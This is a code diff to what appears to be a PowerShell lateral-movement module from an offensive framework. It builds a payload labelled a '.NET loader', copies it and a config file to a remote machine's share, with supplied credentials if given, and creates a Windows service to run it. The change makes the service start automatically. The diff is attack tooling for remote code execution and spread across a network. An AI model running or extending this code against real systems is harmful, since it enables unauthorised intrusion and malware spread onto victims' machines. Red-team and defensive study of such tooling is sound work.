@@ -32,7 +32,7 @@
 load common;
 load lateral;
 
-#Generate a new PowerShell cradle command
+#Generate a new .NET loader
 $contents = payload -Build $Build -Kind $Payload;
 $config = payload -Build $Build -Kind 'csharp_config';
 
@@ -56,7 +56,7 @@ try {
         [System.IO.File]::WriteAllText($uncBinaryPath + ".config", $config);
 
         #Create the service
-        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath;
+        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath -NoStart:$false;
     } else {
         $credentials = New-Object System.Net.NetworkCredential($Username, $Password);
         $share = [common.IO.TemporaryNetworkShare]::Map($sharePath, $credentials);
@@ -69,7 +69,7 @@ try {
         }
 
         #Create the service
-        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath -Username $Username -Password $Password;
+        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath -Username $Username -Password $Password -NoStart:$false;
     }
     $success = $true;
 } catch {
